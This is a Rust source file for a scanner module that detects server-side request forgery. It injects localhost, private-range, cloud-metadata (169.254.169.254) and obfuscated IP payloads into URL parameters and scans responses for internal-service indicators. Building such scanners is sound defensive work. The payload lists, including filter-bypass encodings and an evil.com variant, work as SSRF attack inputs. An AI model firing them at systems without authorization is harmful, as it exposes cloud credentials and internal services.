//! Basic SSRF Detection Module
//!
//! Detects basic SSRF by injecting internal IPs, localhost variants,
//! and private ranges. Uses bounded payload buffers and zero-copy evidence.

use async_trait::async_trait;
use std::sync::Arc;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::{PayloadRegistry, InjectionContext, SafetyLevel};
use crate::http::client::HttpClient;

/// Basic SSRF detection module
pub struct BasicSsrfModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
}

impl BasicSsrfModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
        }
    }

    /// Generate SSRF payloads targeting internal IPs and localhost variants
    fn generate_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::with_capacity(32);
        
        // Standard localhost variants
        payloads.extend_from_slice(&[
            "http://localhost",
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3000",
            "http://127.0.0.1:5000",
            "http://127.0.0.1:8000",
            "http://127.0.0.1:9000",
            "http://[::1]",
            "http://[::1]:80",
            "http://[::1]:8080",
        ]);

        // Private IP ranges (RFC 1918)
        payloads.extend_from_slice(&[
            "http://10.0.0.1",
            "http://10.0.0.2",
            "http://10.255.255.254",
            "http://172.16.0.1",
            "http://172.16.0.2",
            "http://172.31.255.254",
            "http://192.168.0.1",
            "http://192.168.0.2",
            "http://192.168.1.1",
            "http://192.168.1.2",
            "http://192.168.255.254",
        ]);

        // Link-local addresses
        payloads.extend_from_slice(&[
            "http://169.254.169.254",
            "http://169.254.169.254:80",
            "http://169.254.169.254:8080",
            "http://[fe80::1]",
        ]);

        // Cloud metadata endpoints
        payloads.extend_from_slice(&[
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.azure.com/metadata/instance/",
        ]);

        payloads
    }

    /// Generate obfuscated IP payloads (decimal, hex, octal)
    fn generate_obfuscated_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::with_capacity(16);
        
        // Decimal obfuscation
        payloads.push("http://2130706433".to_string()); // 127.0.0.1
        payloads.push("http://2130706433:80".to_string());
        
        // Hex obfuscation
        payloads.push("http://0x7f000001".to_string());
        payloads.push("http://0x7F000001".to_string());
        
        // Octal obfuscation
        payloads.push("http://017700000001".to_string());
        payloads.push("http://0177.0.0.1".to_string());
        
        // Mixed encoding
        payloads.push("http://127.0.0.01".to_string());
        payloads.push("http://127.1".to_string());
        payloads.push("http://127.0.1".to_string());
        
        // IPv6 obfuscation
        payloads.push("http://[::ffff:7f00:1]".to_string());
        payloads.push("http://[0:0:0:0:0:ffff:7f00:1]".to_string());
        
        // URL encoding variations
        payloads.push("http://127.0.0.1%23".to_string());
        payloads.push("http://127.0.0.1%23@evil.com".to_string());
        
        payloads
    }

    /// Test a single SSRF payload
    async fn test_payload(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        payload: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(payload));
        
        let response = self.http_client
            .get(&test_url)
            .timeout(std::time::Duration::from_millis(5000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        // Analyze response for SSRF indicators
        if self.is_ssrf_indicator(&body, &headers, status) {
            let evidence = self.create_evidence(&test_url, &body, &headers, status, payload);
            let finding = Finding::new(
                "basic_ssrf",
                FindingSeverity::High,
                "Server-Side Request Forgery (Basic)",
                format!("SSRF detected via parameter '{}' with payload: {}", param_name, payload),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(payload.to_string())
            .with_evidence(evidence)
            .with_confidence(85)
            .with_tags(vec!["ssrf", "basic", "internal-ip"])
            .with_cwe("CWE-918")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Check if response indicates successful SSRF
    fn is_ssrf_indicator(&self, body: &Bytes, headers: &[(String, String)], status: u16) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        // Check for cloud metadata responses
        let metadata_indicators = [
            "ami-id", "instance-id", "instance-type", "local-ipv4", "public-ipv4",
            "security-groups", "iam/", "user-data", "metadata", "computeMetadata",
            "project-id", "zone", "machine-type", "network-interfaces",
            "subscription-id", "tenant-id", "resource-group", "vm-id", "vm-size",
        ];
        
        for indicator in &metadata_indicators {
            if body_str.to_lowercase().contains(&indicator.to_lowercase()) {
                return true;
            }
        }

        // Check for internal service banners
        let service_indicators = [
            "redis_version", "redis_mode", "connected_clients", "used_memory",
            "memcached", "version", "uptime", "elasticsearch", "cluster_name",
            "mongodb", "postgresql", "mysql", "mariadb", "cassandra",
        ];
        
        for indicator in &service_indicators {
            if body_str.to_lowercase().contains(&indicator.to_lowercase()) {
                return true;
            }
        }

        // Check for error messages revealing internal structure
        let error_indicators = [
            "connection refused", "connection timeout", "no route to host",
            "network unreachable", "host unreachable", "connection reset",
            "internal server error", "service unavailable", "gateway timeout",
        ];
        
        for indicator in &error_indicators {
            if body_str.to_lowercase().contains(&indicator.to_lowercase()) {
                return true;
            }
        }

        // Check for successful internal service responses (2xx/3xx with content)
        if (200..400).contains(&status) && body.len() > 100 {
            // Additional heuristics: check for non-standard server headers
            for (name, value) in headers {
                if name.to_lowercase() == "server" {
                    let server_lower = value.to_lowercase();
                    if server_lower.contains("nginx") || server_lower.contains("apache") 
                        || server_lower.contains("iis") || server_lower.contains("lighttpd") {
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Create evidence for SSRF finding
    fn create_evidence(
        &self,
        url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("SSRF payload '{}' returned status {} with {} bytes", payload, status, body.len()),
            location: EvidenceLocation {
                path: url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 85,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for BasicSsrfModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Basic SSRF module initialized");
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "basic_ssrf",
                "Basic SSRF Detection",
                "Detects basic SSRF by injecting internal IPs, localhost variants, and private ranges",
                Severity::High,
                CheckCategory::ServerSideRequestForgery,
            )
            .with_budget(ResourceBudget::safe())
            .with_tags(vec!["ssrf", "basic", "internal-ip", "localhost", "rfc1918"])
            .with_references(vec![
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://cwe.mitre.org/data/definitions/918.html",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        // Only run if we have URL parameters to test
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(50);

        // Extract parameters from target URL
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test basic payloads
        let basic_payloads = self.generate_payloads();
        for payload in basic_payloads.iter().take(max_requests / params.len().max(1)) {
            for param in &params {
                if request_count >= max_requests {
                    break;
                }
                
                if let Some(finding) = self.test_payload(&ctx, param, payload).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        // Test obfuscated payloads (god-mode only)
        if ctx.god_mode && request_count < max_requests {
            let obfuscated_payloads = self.generate_obfuscated_payloads();
            for payload in obfuscated_payloads.iter().take((max_requests - request_count) / params.len().max(1)) {
                for param in &params {
                    if request_count >= max_requests {
                        break;
                    }
                    
                    if let Some(finding) = self.test_payload(&ctx, param, payload).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        10 // High priority - safe check
    }

    fn dependencies(&self) -> &[&str] {
        &[]
    }
}

impl BasicSsrfModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        // Also check for path parameters (REST-style)
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http::client::HttpClient;
    use crate::analysis::AnalysisContext;
    use crate::payload::PayloadRegistry;

    #[tokio::test]
    async fn test_basic_ssrf_module_creation() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BasicSsrfModule::new(http_client, analysis_ctx, payload_registry);
        assert_eq!(module.metadata().id.as_str(), "basic_ssrf");
    }

    #[test]
    fn test_generate_payloads() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BasicSsrfModule::new(http_client, analysis_ctx, payload_registry);
        let payloads = module.generate_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("127.0.0.1")));
        assert!(payloads.iter().any(|p| p.contains("169.254.169.254")));
        assert!(payloads.iter().any(|p| p.contains("10.0.0.1")));
        assert!(payloads.iter().any(|p| p.contains("192.168.1.1")));
    }

    #[test]
    fn test_generate_obfuscated_payloads() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BasicSsrfModule::new(http_client, analysis_ctx, payload_registry);
        let payloads = module.generate_obfuscated_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("2130706433"))); // decimal
        assert!(payloads.iter().any(|p| p.contains("0x7f000001"))); // hex
        assert!(payloads.iter().any(|p| p.contains("0177"))); // octal
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(AnalysisContext::new());
        let payload_registry = Arc::new(PayloadRegistry::new());
        
        let module = BasicSsrfModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?user=test&id=123");
        assert_eq!(params, vec!["user", "id"]);
        
        let params = module.extract_parameters("http://example.com/api/users/123");
        assert!(params.is_empty());
    }
}